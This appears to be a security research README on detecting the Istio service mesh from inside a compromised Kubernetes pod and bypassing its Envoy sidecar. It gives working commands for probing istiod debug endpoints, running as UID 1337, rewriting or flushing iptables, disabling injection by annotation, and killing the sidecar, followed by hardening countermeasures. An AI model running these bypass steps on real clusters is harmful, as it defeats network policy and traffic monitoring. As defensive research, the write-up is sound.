# Istio security restrictions bypass
The research was conducted during Summ3r 0f h4ck 2021 internship by [r0binak](https://github.com/r0binak) and [Forest1k](https://github.com/Forest1k). Based on [Istio version 1.10.3](https://github.com/istio/istio)
![final_not](https://user-images.githubusercontent.com/80983900/127554998-bc423ac0-eb93-47a5-89e5-2ff6af9670fa.png)



## Detect Istio 
When the adversary is inside the pod (or get RCE in app), he or she doesn't know that k8s work with Istio service mesh.

- Use curl to detect Istio:
 
  ```bash 
  curl localhost:15000
  ``` 
     > In Istio 1.11 update, the Istiod debug interface is only accessible over localhost or with proper authentication (mTLS or JWT).
  ```bash
  curl -sS istiod.istio-system:15014/debug/endpointz
  ```
  ```bash
  curl -sS istiod.istio-system:15014/metrics
  ```
  ```bash
  curl -sS istiod.istio-system:15014/debug/registryz
  ```
  ```bash
  curl -sS istiod.istio-system:15014/debug/registryz?brief=1
  ```
  ```bash
  curl -sS istiod.istio-system:15014/debug/configz
  ```
     > Istio 1.11 version added the HTTP endpoint localhost:15004/debug/<typeurl> to the Istio sidecar agent. GET requests to that URL will be resolved by sending an xDS discovery “event” to istiod.
  ```bash
  curl localhost:15004/debug/endpointz
  ```
  ```bash
  curl -fsI http://localhost:15021/healthz/ready
  ```
  From within a workload container deployed with the Istio sidecar proxy, run the following
command:
  ```bash
  curl -s http://localhost:15000/config_dump?include_cds
  ```
  Notice that the configuration for the sidecar proxy is returned.
- create a pod with UID 1337:

  ```yaml
  securityContext:
    runAsUser: 1337
  ```
  If your existing service account has sufficient rights to create a pod, create one with UID 1337. The new pod will not have a Istio sidecar. 
- Send DNS request:
  ```bash
  nslookup istiod.istio-system
  ```
  List all service DNS records with their corresponding svc IP:
  ```bash
  dig +short srv any.any.svc.cluster.local
  ```
## Bypass Istio sidecar
### Change iptables rules
> When a container has CAP_NET_ADMIN capability granted, it can rewrite its own iptables rules and bypass the Envoy proxy. 

Check iptables rules:
```bash
root@samplepod:~$ iptables -t nat -L
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination
ISTIO_INBOUND  tcp  --  anywhere             anywhere
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
ISTIO_OUTPUT  tcp  --  anywhere             anywhere
Chain POSTROUTING (policy ACCEPT)
target     prot opt source               destination
Chain ISTIO_INBOUND (1 references)
target     prot opt source               destination
RETURN     tcp  --  anywhere             anywhere             tcp dpt:15008
RETURN     tcp  --  anywhere             anywhere             tcp dpt:ssh
RETURN     tcp  --  anywhere             anywhere             tcp dpt:15090
RETURN     tcp  --  anywhere             anywhere             tcp dpt:15021
RETURN     tcp  --  anywhere             anywhere             tcp dpt:15020
ISTIO_IN_REDIRECT  tcp  --  anywhere             anywhere
Chain ISTIO_IN_REDIRECT (3 references)
target     prot opt source               destination
REDIRECT   tcp  --  anywhere             anywhere             redir ports 15006
Chain ISTIO_OUTPUT (1 references)
target     prot opt source               destination
RETURN     all  --  ip-127-0-0-6.eu-west-3.compute.internal  anywhere
ISTIO_IN_REDIRECT  all  --  anywhere            !localhost            owner UID match 1337
RETURN     all  --  anywhere             anywhere             ! owner UID match 1337
RETURN     all  --  anywhere             anywhere             owner UID match 1337
ISTIO_IN_REDIRECT  all  --  anywhere            !localhost            owner GID match 1337
RETURN     all  --  anywhere             anywhere             ! owner GID match 1337
RETURN     all  --  anywhere             anywhere             owner GID match 1337
RETURN     all  --  anywhere             localhost
ISTIO_REDIRECT  all  --  anywhere             anywhere
Chain ISTIO_REDIRECT (1 references)
target     prot opt source               destination
REDIRECT   tcp  --  anywhere             anywhere             redir ports 15001
```
We know that ```ISTIO_IN_REDIRECT``` is redirecting our inbound traffic to the proxy. All we need to do is to inject a rule that runs before it and RETURNS the packet early, skipping the redirect. We only want to trick Istio into not intercepting packets for port 7777. We still do want 8080 to go through the proxy, which is why we've selected a destination port of 7777.

Add new rule:
```console
root@samplepod:~$ iptables -t nat -I PREROUTING -p tcp --dport 7777 -j RETURN
```
```-I PREROUTING``` means to prepend the rule to the front of the ```PREROUTING``` chain. By using ```-I```, we can ensure our rule runs before Istio's rule.

Check iptables rules again:
```console
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination         
RETURN     tcp  --  anywhere             anywhere             tcp dpt:7777
```
If you want delete all rules:
```console
root@samplepod:~$ iptables -t nat --flush
```
```console
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination         

Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         

Chain POSTROUTING (policy ACCEPT)
target     prot opt source               destination         

Chain ISTIO_INBOUND (0 references)
target     prot opt source               destination         

Chain ISTIO_IN_REDIRECT (0 references)
target     prot opt source               destination         

Chain ISTIO_OUTPUT (0 references)
target     prot opt source               destination         

Chain ISTIO_REDIRECT (0 references)
target     prot opt source               destination    
```
- If you have the ability to create pods, add these annotations to disable the Istio sidecar:
  ```yaml
  annotations:
        sidecar.istio.io/inject: "false" 
   ```
  ```yaml
  annotations:
        proxy.istio.io/config: '{ "terminationDrainDuration": 20s}'
  ```
- Non-TCP based protocols, such as UDP, are not proxied. These protocols will continue to function as normal, without any interception by the Istio proxy but cannot be used in proxy-only components such as ingress or egress gateways.
- By default, Istio’s sidecar iptables inbound redirection rules shortcircuit if the destination port is 15090, 15021, 15020, or 22. As Envoy does not listen on
port 22, this enables the workload container to do so and receive connections to the port.
- You can also selectively disable ports for proxying Istio sidecar:

  ```yaml
  annotations:
        traffic.sidecar.istio.io/excludeInboundPorts: "8090"
  ```  
- Need root and have spec in the pod:
  ```yaml
  shareProcessNamespace: true
  ```
  ```console 
  podname@samplepod:~$ sudo su -
  root@samplepod:~$ adduser --uid 1337 envoyuser
  root@samplepod:~$ su - envoyuser
  envoyuser@samplepod:~$ pkill -f /usr/local/bin/pilot-agent
  ```
- Do this curl requests in the pod for kill sidecar. However, the sidecar will restart after a while.

  ```curl --request POST localhost:15000/quitquitquit```
  
  ```curl --request POST localhost:15020/quitquitquit```

## Countermeasure from attacks
- Change Envoy admin port:
  ```yaml
  annotations:
        proxy.istio.io/config: |
          proxyAdminPort: 14000
  ```
- Set limited rights for a service account:
  ```yaml
  kind: Role
  apiVersion: rbac.authorization.k8s.io/v1
  metadata:
    namespace: mynamespace
    name: example-role
  rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "watch", "list"] 
  ```
- Drop all capabilities and include only the ones you need:
  ```yaml
  securityContext:
      capabilities:
        drop:
          - all
        add: ["MKNOD"]
   ```
- Use distroless images. Non-essential executables and libraries are no longer part of the images when using the distroless variant. The attack surface is reduced. Include the smallest possible set of vulnerabilities.
- Deploy the Istio CNI plugin in your cluster so it can manage iptables rules in place of the istio-init containers. The Istio CNI plugin performs the Istio mesh pod traffic redirection in the Kubernetes pod lifecycle’s network setup phase, thereby removing the requirement for the NET_ADMIN and NET_RAW capabilities for users deploying pods into the Istio mesh. The Istio CNI plugin replaces the functionality provided by the istio-init container.

In most environments, a basic Istio cluster with CNI enabled can be installed using the following command:

 ```console
 $ cat <<EOF > istio-cni.yaml
 apiVersion: install.istio.io/v1alpha1
 kind: IstioOperator
 spec:
   components:
     cni:
       enabled: true
   values:
     cni:
       excludeNamespaces:
        - istio-system
        - kube-system
       logLevel: info
 EOF
 $ istioctl install -f istio-cni.yaml
 ```
- Envoy doesn't support UDP, UDP traffic won't be proxied, so use NetworkPolicy to ensure only TCP traffic is allowed to/from the Pod (e.g., to avoid TCP traffic being tunnelled out via a VPN over UDP)
- Run ```istioctl proxy-status``` for the current Istio Pilot sync status of each pod istio-proxy container.
- Retrieve the current Envoy xDS configuration for a given pod’s proxy sidecar with the ```istioctl proxy-config cluster|listener|endpoint|route``` commands.
- If you have applied an Istio configuration, but it doesn't seem to be taking effect, and ```istioctl proxy-status``` shows all proxies as synced, there may be a conflict with the rule. Check the Pilot logs with the command ```kubectl logs -l app=pilot -n istio-system -c discovery``` and if you see a non-empty ```ProxyStatus``` block, Pilot cannot reconcile or apply configurations for the named Envoy resources.
- If Pilot doesn’t report any conflicts or other configuration issues, the proxies may be having a connection issue. You can check the log of the ```istio-proxy``` container in the source and destination pods for issues. If you don’t see anything helpful, you can increase the logging verbosity of the istio-proxy sidecar, which listens on port 15000 of the pod. (You may have to use ```kubectl port-forward``` to be able to connect to the sidecar.) Use a ```POST``` request against the proxy port to update the logging level: ```curl -s -XPOST http://localhost:15000/logging?level=debug```
- Istio telemetry also collects the Envoy access logs, which include the connection response flags. Use the command ```kubectl logs -l app=telemetry -n istio-system -c mixer``` to see the log entries if you’re using Mixer telemetry. If your cluster has a Prometheus instance configured to scrape Istio’s metrics, you can query that.
## Istio security best practices
https://istio.io/latest/docs/ops/best-practices/security/
## References
[A Survey of Istio’s Network Security Features](https://research.nccgroup.com/2020/03/04/a-survey-of-istios-network-security-features/)

[Announcing the results of Istio’s first security assessment](https://istio.io/latest/blog/2021/ncc-security-assessment/)

[Istio security assessment report](https://istio.io/latest/blog/2021/ncc-security-assessment/NCC_Group_Google_GOIST2005_Report_2020-08-06_v1.1.pdf)
